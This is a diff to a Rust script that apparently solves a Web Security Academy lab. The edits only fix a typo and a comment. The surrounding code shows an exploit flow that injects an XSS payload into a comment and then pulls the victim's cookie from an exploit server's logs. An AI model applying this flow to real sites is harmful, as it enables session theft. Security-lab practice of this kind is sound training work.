@@ -47,7 +47,7 @@ fn main() {
     // change this to your lab URL
     let url = "https://0a07001904dedc7b83692d2900f80018.web-security-academy.net";
 
-    // change this url to your exploit server
+    // change this to your exploit server URL
     let exploit_server_url = "https://exploit-0af0009f0492dc0a83172cf1019f000a.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
@@ -57,10 +57,10 @@ fn main() {
     let start_time = time::Instant::now();
 
     // put an XSS payload in a comment
-    let is_exloited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url);
+    let is_exploited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url);
 
     // if you injected XSS successfully
-    if is_exloited {
+    if is_exploited {
         // try to extract the cookie from the your server logs
         let cookie = extract_cookie_from_logs(&client, exploit_server_url);
 
